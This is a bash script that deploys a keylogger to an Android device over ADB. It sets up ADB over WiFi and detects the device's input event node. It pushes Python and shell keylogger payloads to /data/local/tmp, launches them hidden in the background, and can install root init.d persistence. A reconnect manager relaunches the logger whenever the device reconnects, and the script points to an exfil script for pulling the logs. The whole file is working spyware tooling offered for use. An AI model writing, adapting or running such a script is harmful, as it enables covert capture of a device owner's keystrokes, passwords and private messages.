#!/usr/bin/env bash
# =============================================================
# deploy.sh — Full payload deployment to Android device via ADB
# =============================================================
# Supports:
#   - USB deployment
#   - WiFi deployment (auto-setup or manual IP)
#   - ADB-over-WiFi reconnect manager (wifi_connect.py)
#   - Keylogger launch in background
#   - Optional persistence via init.d
# =============================================================

set -euo pipefail

# ── Config ────────────────────────────────────────────────────
SERIAL=""                               # USB serial (empty = first device)
WIFI_IP=""                              # set to device IP to skip auto-detect
WIFI_PORT=5555
AUTO_WIFI=1                             # 1 = auto-enable WiFi ADB via USB
REMOTE_DIR="/data/local/tmp"
REMOTE_LOG="${REMOTE_DIR}/kl.txt"
PERSIST=0                               # 1 = install init.d persistence (needs root)
HEARTBEAT=5                             # wifi_connect.py heartbeat interval (seconds)
# ─────────────────────────────────────────────────────────────

ADB="adb"
[[ -n "$SERIAL" ]] && ADB="adb -s $SERIAL"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

log()  { echo -e "\e[32m[+]\e[0m $*"; }
warn() { echo -e "\e[33m[!]\e[0m $*"; }
die()  { echo -e "\e[31m[-]\e[0m $*"; exit 1; }

command -v adb &>/dev/null || die "adb not found in PATH"

# ── 1. WiFi auto-setup ────────────────────────────────────────
if [[ "$AUTO_WIFI" -eq 1 && -z "$WIFI_IP" ]]; then
    log "Auto-setup: enabling ADB over WiFi via USB..."
    # Requires USB connection first
    $ADB wait-for-device
    MODEL=$($ADB shell getprop ro.product.model 2>/dev/null | tr -d '\r')
    ANDROID=$($ADB shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')
    log "USB device: $MODEL (Android $ANDROID)"

    # Get WiFi IP
    WIFI_IP=$($ADB shell ip -f inet addr show wlan0 2>/dev/null \
        | grep -oE 'inet [0-9.]+' | awk '{print $2}' | head -1 | tr -d '\r')

    if [[ -z "$WIFI_IP" ]]; then
        WIFI_IP=$($ADB shell getprop dhcp.wlan0.ipaddress 2>/dev/null | tr -d '\r')
    fi

    [[ -z "$WIFI_IP" ]] && die "Could not detect WiFi IP. Is WiFi enabled on device?"
    log "Device WiFi IP: $WIFI_IP"

    # Enable TCP/IP mode
    $ADB tcpip $WIFI_PORT
    log "TCP/IP mode enabled on port $WIFI_PORT"
    sleep 2

    # Connect over WiFi
    adb connect "${WIFI_IP}:${WIFI_PORT}"
    log "WiFi ADB connected: ${WIFI_IP}:${WIFI_PORT}"
    log "You can unplug USB now."

    # Switch ADB target to WiFi serial
    ADB="adb -s ${WIFI_IP}:${WIFI_PORT}"
elif [[ -n "$WIFI_IP" ]]; then
    log "Connecting to manual IP: ${WIFI_IP}:${WIFI_PORT}"
    adb connect "${WIFI_IP}:${WIFI_PORT}"
    ADB="adb -s ${WIFI_IP}:${WIFI_PORT}"
else
    log "Using USB/default ADB connection."
    $ADB wait-for-device
fi

# ── 2. Detect event node ──────────────────────────────────────
log "Detecting input event node..."
EVENT_NODE=$($ADB shell '
  awk '"'"'
    /^H:/ { handlers=$0 }
    /^B: EV=/ {
      ev=strtonum("0x" $3)
      if (and(ev, 2)) {
        n=split(handlers, a, " ")
        for(i=1;i<=n;i++) {
          if (a[i] ~ /^event[0-9]/) {
            print "/dev/input/" a[i]
            exit
          }
        }
      }
    }
  '"'"' /proc/bus/input/devices
' 2>/dev/null | tr -d '\r')
[[ -z "$EVENT_NODE" ]] && { warn "Event node not detected, using event0"; EVENT_NODE="/dev/input/event0"; }
log "Event node: $EVENT_NODE"

# ── 3. Push files ─────────────────────────────────────────────
log "Pushing payload files..."
$ADB push "${SCRIPT_DIR}/keylogger.py"    "${REMOTE_DIR}/keylogger.py"
$ADB push "${SCRIPT_DIR}/keylogger_sh.sh" "${REMOTE_DIR}/keylogger_sh.sh"
$ADB push "${SCRIPT_DIR}/wifi_connect.py" "${REMOTE_DIR}/wifi_connect.py"
$ADB shell chmod 755 "${REMOTE_DIR}/keylogger.py"
$ADB shell chmod 755 "${REMOTE_DIR}/keylogger_sh.sh"
$ADB shell chmod 755 "${REMOTE_DIR}/wifi_connect.py"
log "Files pushed."

# ── 4. Launch keylogger ───────────────────────────────────────
PYTHON=$($ADB shell 'command -v python3 || command -v python || echo ""' | tr -d '\r')
EVENT_ARG=$(basename "$EVENT_NODE")

if [[ -n "$PYTHON" ]]; then
    log "Python found: $PYTHON"
    $ADB shell "nohup $PYTHON ${REMOTE_DIR}/keylogger.py \
        --event $EVENT_ARG \
        --out $REMOTE_LOG \
        --exfil 0 \
        > ${REMOTE_DIR}/kl_stdout.txt 2>&1 &"
    log "Keylogger started in background."
else
    warn "Python not found — using shell fallback."
    $ADB shell "nohup sh ${REMOTE_DIR}/keylogger_sh.sh > /dev/null 2>&1 &"
    log "Shell keylogger started."
fi

# ── 5. Persistence (optional) ─────────────────────────────────
if [[ "$PERSIST" -eq 1 ]]; then
    log "Installing init.d persistence..."
    INIT_SCRIPT="/etc/init.d/99keylogger"
    $ADB shell su -c "
        echo '#!/system/bin/sh' > $INIT_SCRIPT
        echo '$PYTHON ${REMOTE_DIR}/keylogger.py --event $EVENT_ARG --out $REMOTE_LOG --exfil 0 &' >> $INIT_SCRIPT
        chmod 755 $INIT_SCRIPT
    " 2>/dev/null && log "Persistence installed." || warn "Persistence failed (no root?)"
fi

# ── 6. Verify running ─────────────────────────────────────────
sleep 2
PID=$($ADB shell 'ps -A 2>/dev/null || ps' \
    | grep -E 'keylogger|python' | grep -v grep \
    | awk '{print $2}' | head -1 | tr -d '\r')
[[ -n "$PID" ]] && log "Keylogger running — PID: $PID" || warn "Could not confirm PID. Check ${REMOTE_DIR}/kl_stdout.txt"

# ── 7. Start WiFi reconnect manager (local, background) ───────
if [[ -n "$WIFI_IP" ]]; then
    log "Starting WiFi reconnect manager on this machine..."
    ON_CONNECT_CMD="adb -s ${WIFI_IP}:${WIFI_PORT} shell \
        'pgrep -f keylogger.py || nohup $PYTHON ${REMOTE_DIR}/keylogger.py \
        --event $EVENT_ARG --out $REMOTE_LOG --exfil 0 > /dev/null 2>&1 &'"

    nohup python3 "${SCRIPT_DIR}/wifi_connect.py" \
        --ip "$WIFI_IP" \
        --port "$WIFI_PORT" \
        --heartbeat "$HEARTBEAT" \
        --on-connect "$ON_CONNECT_CMD" \
        > "${SCRIPT_DIR}/wifi_manager.log" 2>&1 &
    MGPID=$!
    log "WiFi manager running — PID: $MGPID | log: wifi_manager.log"
fi

log "Done."
echo ""
log "To pull logs:  ./exfil.sh"
log "To stop:       adb shell kill $PID"
